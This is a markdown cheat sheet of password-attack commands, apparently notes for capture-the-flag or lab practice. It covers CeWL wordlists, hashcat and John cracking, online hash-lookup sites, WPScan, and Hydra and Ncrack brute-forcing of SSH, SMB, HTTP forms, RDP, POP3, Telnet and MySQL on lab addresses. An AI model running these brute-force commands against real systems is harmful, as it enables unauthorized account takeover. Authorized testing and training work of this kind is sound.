## CEWL
```
cewl -d 2 -m 5 -w docswords.txt url 
```
-d depth
-m minimum word length  
-w output file  
--lowercase lowercase all parsed words (optional)
## HASHCAT
https://hashcat.net/wiki/doku.php?id=example_hashes 
https://mattw.io/hashID/types (HashID match)

```
hashcat -m "number" hash.txt rockyou.txt
```
## WPScan
Brute password with know username
```
wpscan --url http://10.10.10.10 --passwords rockyou.txt --usernames elliot
```
Brute Username
https://github.com/SecurityCompass/wordpress-scripts/blob/master/wp_login_user_enumeration.py
```
python wp_brute.py url -t
```
## JOHN
```
john hash.txt --wordlist=~/rockyou.txt
```
## ONLINE TOOLS
https://hashes.com/en/decrypt/hash
MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512 hashes
https://crackstation.net/
LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults
https://www.dcode.fr/tools-list  
MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher  
https://www.md5online.org/md5-decrypt.html (MD5)
https://md5.gromweb.com/ (MD5)

## PROTOCOLS BRUTEFORCE
### Hydra  
TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, Subversion/SVN, Firebird, LDAP2, Cisco AAA
    
### Medusa  
AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form
    
### Ncrack(Fastest)  
RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet
    
## Brute SSH
ncrack (fastest)
```
ncrack -v -U user.txt -P pass.txt ssh://10.10.10.10:<port> -T5  
```
Hydra
```
hydra -L users.txt -P pass.txt 192.168.0.114 ssh (use if you know username)
```
## Brute SMB
NCRACK
```
ncrack -u qiu -P rockyou.txt -T 5 192.168.0.116 -p smb -v
```

## Using HYDRA
#### HTTP Post Form
u need to identify the exact parameters in the request
```
hydra -L users.txt -P rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Username or Password" -V -s 7654
```
to bruteforce a single parameter to get access
```
hydra 10.0.2.22 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P ~/rockyou.txt -t 10 -w 30 
```
#### HTTP Get Form
(Basic Auth)
```
hydra -l admin -P ~/rockyou.txt -f 192.168.143.201 http-get / 
```
#### SSH
(use -l -p if you know username and pass else bruteforce using -L -P)
```
hydra -l kali -P usernames.txt ssh://IP
```
#### RDP
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```    
#### POP3
POP3 Bruteforce with valid username
```
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.10 -s 55007 pop3
```
#### Telnet
```
hydra -l james -P passwords.txt 10.2.2.23 telnet
```
#### Mysql
```
hydra -l root -P ~/rockyou.txt sunset-midnight mysql -t 4
```